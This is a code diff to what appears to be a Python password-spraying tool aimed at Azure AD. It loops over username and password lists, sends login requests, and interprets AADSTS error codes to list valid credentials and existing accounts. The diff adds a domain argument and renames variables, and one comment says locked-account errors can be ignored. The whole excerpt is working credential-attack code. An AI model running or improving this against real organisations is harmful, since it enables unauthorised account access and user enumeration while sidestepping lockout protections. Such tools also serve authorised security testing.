@@ -22,21 +22,30 @@ def main():
         dest="p",
         required=True,
         metavar="password"
+    ),
+    parser.add_argument(
+        "-d",
+        help="domain",
+        dest="d",
+        required=True,
+        metavar="domain"
     )
 
     args = parser.parse_args()
 
     if os.path.exists(args.u):
         with open(args.u, 'r') as f:
-            usernames = f.read().splitlines()
+            users = f.read().splitlines()
     else:
-        usernames = [ args.u ]
+        users = [ args.u ]
     
     if os.path.exists(args.p):
         with open(args.p, 'r') as f:
             passwords = f.read().splitlines()
     else:
         passwords = [ args.p ]
+
+    domain = args.d
 
     raw_xml = '''<?xml version="1.0" encoding="UTF-8"?>
         <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
@@ -73,15 +82,10 @@ def main():
     '''
 
     creds = []
-    users = []
+    valid_users = []
 
-    for username in usernames:
-
-        try:
-            domain = username.split("@")[1]
-        except:
-            print("invalid user name, format: user@domain")
-            break
+    for user in users:
+        username  = "{}@{}".format(user, domain)
 
         for password in passwords:
 
@@ -121,7 +125,7 @@ def main():
                 if re.match("AADSTS50053" , text):
                     print("user {} exists and the correct username and password were entered, but the account is locked".format(username))
                     creds.append("{}:{}".format(username, password))
-                    #break # although this error indicates the account is locked, the lock doesnt seem to apply and cant be ignored.
+                    #break # although this error indicates the account is locked, the lock doesnt seem to apply and can be ignored.
 
                 if re.match("AADSTS50056" , text):
                     print("user {} exists but does not have a password in Azure AD".format(username))
@@ -129,11 +133,11 @@ def main():
 
                 if re.match("AADSTS50126" , text):
                     print("user {} exists, but the wrong password ({}) was entered".format(username, password))
-                    users.append(username)
+                    valid_users.append(username)
 
                 if re.match("AADSTS80014" , text):
                     print("user {} exists, but the maximum Pass-through Authentication time was exceeded".format(username))
-                    users.append(username)
+                    valid_users.append(username)
                     break
 
             if response.status_code == 200:
@@ -152,10 +156,10 @@ def main():
     else:
         print("\nno valid creds found")
     
-    if users:
+    if valid_users:
         print("\nUSERS")
         print("---")
-        for user in set(users):
+        for user in set(valid_users):
             print(user)
     else:
         print("\nno valid usernames found")
